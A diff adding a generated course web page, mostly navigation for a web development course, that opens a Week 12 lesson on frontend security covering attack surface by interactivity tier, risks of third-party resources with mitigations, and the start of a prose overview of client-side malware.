+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week7/04_vue_cli_single_file_components/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vue CLI and Single File Components
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Week 8
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Week 8
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week8/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week8/01_web_api_design_rest/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web API design with REST
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week8/02_rest_problems_graphql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Problems with REST and GraphQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week8/03_markup_text_representations/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Markup and text representations
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week8/04_jamstack_architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JAMstack architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week8/05_vue_flask_integration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vue and Flask integration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Week 9
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Week 9
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week9/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week9/01_web_servers_concurrency/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web servers and concurrency
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week9/02_async_task_architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Asynchronous task architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week9/03_distributed_messaging/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Distributed messaging
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week9/04_task_queue_mechanics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Task queue mechanics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week9/05_celery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Celery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Week 10
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Week 10
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week10/01_inter_service_messaging_and_message_queues_recap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Inter-service messaging and message queues
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week10/02_lightweight_api_calls_and_messaging_patterns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lightweight API calls and messaging patterns
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week10/03_webhooks_deep_dive/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Webhooks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week10/04_webhooks_vs_alternative_architectures/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Webhooks and alternative architectures
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week10/05_webhook_implementation_debugging_security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Webhook implementation, debugging, and security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week10/06_client_side_updates_and_push_to_client/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client-side updates and push to client
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week10/07_client_update_strategies_polling_and_long_polling/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Polling and long polling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week10/08_server_sent_events_sse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server-Sent Events
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week10/09_push_notifications_and_modern_push_protocols/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Push notifications and modern push protocols
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+        
+          
+          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Week 11
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_12">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Week 11
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week11/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week11/notes_performance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Performance fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week11/notes_speed/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Speed
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week11/notes_user_experience/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    User experience
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week11/notes_tools_and_measurement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tools and measurement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week11/notes_scaling/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Scaling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week11/notes_components_of_an_app/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Components of an application
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week11/notes_server_architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week11/notes_monitoring_and_measuring/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Monitoring and measuring
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week11/notes_caching/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Caching
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week11/notes_summary/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Summary
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Week 12
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_13">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Week 12
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../01_fundamentals_privacy_vs_security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Privacy versus security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Frontend security
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Frontend security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#learning-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Learning objectives
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21-threat-landscape-scenarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 Threat Landscape &amp; Scenarios
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.1 Threat Landscape &amp; Scenarios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#interactivity-tiers-data-risk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Interactivity Tiers &amp; Data Risk
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#resource-inclusion-risks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Resource Inclusion Risks
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#client-side-exploits-malware" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Client-Side Exploits &amp; Malware
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22-cookie-security-privacy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 Cookie Security &amp; Privacy
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.2 Cookie Security &amp; Privacy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session-cookies-vs-permanent-persistent-cookies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session Cookies vs Permanent / Persistent Cookies
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie-security-flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cookie Security Flags
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#first-party-vs-third-party-cookies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        First-Party vs Third-Party Cookies
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-web-application-vulnerabilities-client-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.3 Web Application Vulnerabilities &amp; Client Attacks
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.3 Web Application Vulnerabilities &amp; Client Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cross-site-scripting-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cross-Site Scripting (XSS)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cross-site-request-forgery-csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cross-Site Request Forgery (CSRF)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#24-browser-security-mechanisms-policies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.4 Browser Security Mechanisms &amp; Policies
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.4 Browser Security Mechanisms &amp; Policies">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#same-origin-policy-sop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Same-Origin Policy (SOP)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cross-origin-resource-sharing-cors" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cross-Origin Resource Sharing (CORS)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content-security-policy-csp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Content Security Policy (CSP)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#secure-contexts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Secure Contexts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#browser-sandboxing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Browser Sandboxing
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#25-frontend-security-summary-best-practices" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.5 Frontend Security Summary &amp; Best Practices
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#further-practice" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Further practice
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../03_backend_security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Backend security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#learning-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Learning objectives
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21-threat-landscape-scenarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 Threat Landscape &amp; Scenarios
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.1 Threat Landscape &amp; Scenarios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#interactivity-tiers-data-risk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Interactivity Tiers &amp; Data Risk
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#resource-inclusion-risks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Resource Inclusion Risks
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#client-side-exploits-malware" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Client-Side Exploits &amp; Malware
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22-cookie-security-privacy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 Cookie Security &amp; Privacy
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.2 Cookie Security &amp; Privacy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session-cookies-vs-permanent-persistent-cookies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session Cookies vs Permanent / Persistent Cookies
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie-security-flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cookie Security Flags
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#first-party-vs-third-party-cookies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        First-Party vs Third-Party Cookies
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-web-application-vulnerabilities-client-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.3 Web Application Vulnerabilities &amp; Client Attacks
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.3 Web Application Vulnerabilities &amp; Client Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cross-site-scripting-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cross-Site Scripting (XSS)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cross-site-request-forgery-csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cross-Site Request Forgery (CSRF)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#24-browser-security-mechanisms-policies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.4 Browser Security Mechanisms &amp; Policies
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.4 Browser Security Mechanisms &amp; Policies">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#same-origin-policy-sop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Same-Origin Policy (SOP)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cross-origin-resource-sharing-cors" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cross-Origin Resource Sharing (CORS)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content-security-policy-csp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Content Security Policy (CSP)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#secure-contexts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Secure Contexts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#browser-sandboxing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Browser Sandboxing
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#25-frontend-security-summary-best-practices" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.5 Frontend Security Summary &amp; Best Practices
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#further-practice" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Further practice
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="week-12-section-2-frontend-security">Week 12 — Section 2: Frontend Security</h1>
+<h2 id="learning-objectives">Learning objectives</h2>
+<p>By the end of this topic, you should be able to:</p>
+<ul>
+<li>Explain the main ideas covered in <strong>Week 12 — Section 2: Frontend Security</strong>.</li>
+<li>Connect these ideas to modern web application development.</li>
+<li>Recognize the patterns, terminology, and trade-offs used in practice.</li>
+</ul>
+<hr />
+<h2 id="21-threat-landscape-scenarios">2.1 Threat Landscape &amp; Scenarios</h2>
+<h3 id="interactivity-tiers-data-risk">Interactivity Tiers &amp; Data Risk</h3>
+<p>The frontend's attack surface grows with its interactivity. Not all web pages carry the same risk:</p>
+<table>
+<thead>
+<tr>
+<th>Tier</th>
+<th>Example</th>
+<th>Risk Level</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Static HTML</strong></td>
+<td>A blog with no forms, no JS</td>
+<td>Low</td>
+<td>No user input, no dynamic execution, no state</td>
+</tr>
+<tr>
+<td><strong>Simple Forms</strong></td>
+<td>Contact form, login page</td>
+<td>Medium</td>
+<td>User data submitted; form fields can be tampered with</td>
+</tr>
+<tr>
+<td><strong>Rich JS SPA</strong></td>
+<td>Gmail, Twitter, online banking</td>
+<td>High</td>
+<td>Complex client-side logic, persistent sessions, third-party scripts, dynamic DOM, OAuth flows</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>As complexity increases, the <strong>attack surface expands</strong> exponentially — more code = more potential vulnerabilities.</li>
+<li>SPAs (Single Page Applications built with React, Vue, Angular) are especially risky because they:</li>
+<li>Execute a large amount of JavaScript in the browser.</li>
+<li>Manage client-side routing and sensitive state.</li>
+<li>Load dozens of third-party scripts (analytics, ads, chat widgets).</li>
+</ul>
+<h3 id="resource-inclusion-risks">Resource Inclusion Risks</h3>
+<p>When your page loads resources from external sources, you are <strong>implicitly trusting those sources</strong>:</p>
+<ul>
+<li><strong>Cross-site cookies:</strong> Third-party scripts can set and read their own cookies to track users across sites.</li>
+<li><strong>Tracking pixels:</strong> Invisible 1×1 pixel <code>&lt;img&gt;</code> tags embedded in pages (and emails) that report back load events — identifying the user's IP, device, time of visit, and email open events.</li>
+<li><strong>CDN-based profiling:</strong> Loading jQuery, fonts, or analytics from a CDN (e.g., <code>cdn.example.com/jquery.js</code>) allows that CDN operator to see exactly which users visited which pages across every site using that CDN.</li>
+<li><strong>Example:</strong> Google Fonts and Google Analytics, when loaded from Google's CDN, report the user's browser and IP to Google even on non-Google sites.</li>
+<li><strong>Mitigation:</strong> Self-host static resources where possible, or use the <code>crossorigin="anonymous"</code> attribute and <code>Subresource Integrity (SRI)</code> hashes to verify resource integrity.</li>
+</ul>
+<h3 id="client-side-exploits-malware">Client-Side Exploits &amp; Malware</h3>
+<p>Beyond web attacks, the browser itself is a platform that can be abused:</p>
+<ul>
+<li><strong>Spyware / Malicious browser extensions:</strong> Extensions run with elevated permissions and can read all page content, form data, and cookies across every site you visit. Malicious extensions have stolen banking credentials and crypto wallets at scale.</li>
+<li><strong>Keystroke loggers:</strong> JavaScript injected into a page (via XSS or a compromised third-party script) can capture every keystroke — including passwords typed into forms.</li>
